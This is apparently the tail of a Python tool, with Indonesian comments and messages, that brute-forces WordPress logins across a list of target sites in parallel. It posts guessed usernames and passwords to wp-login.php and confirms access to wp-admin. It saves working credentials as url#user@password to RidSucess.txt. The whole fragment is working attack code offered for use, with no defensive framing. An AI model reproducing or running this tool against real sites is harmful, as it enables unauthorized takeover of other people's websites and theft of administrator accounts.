                            print(f"{Colors.GREEN}[ INFO ]{Colors.RESET} {url} - Berhasil !!")
                            print(f"{Colors.CYAN}USER: {username} PASS: {password}{Colors.RESET}")
                            check_log(url, username, password)
                        else:
                            print(f"{Colors.GREEN}[ INFO ]{Colors.RESET} {url} - Gagal !!")
                            print(f"{Colors.CYAN}USER: {username} PASS: {password}{Colors.RESET}")
                    except (RemoteDisconnected, ConnectionError, SSLError) as e:
                        print(f"Error: {e}")
                        time.sleep(2)  
        else:
            print(f"--| {url} [Tidak ditemukan username]")
    except Exception as e:
        print(f"Error: {e}")

def check_log(url, user, password):
    session = create_session()
    try:
        post = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': url + '/wp-admin/', 'testcookie': '1'}
        login = session.post(url + '/wp-login.php', data=post, headers=headers, timeout=20)
        check = session.get(url + '/wp-admin', headers=headers, timeout=20)
        if 'profile.php' in check.content.decode():
            with open('RidSucess.txt', 'a') as f:
                f.write(url + '/wp-login.php' + '#' + user + '@' + password + '\n')
        else:
            with open('RidFailed.txt', 'a') as f:
                f.write(url + '/wp-login.php#' + user + '\n')
    except Exception as e:
        print(f"Error: {e}")

# Menjalankan exploitasi menggunakan multi-threading
with Pool(10) as pool:  # Tentukan jumlah thread sesuai keinginan
    pool.map(exploit, target)

print("\nSelesai.")

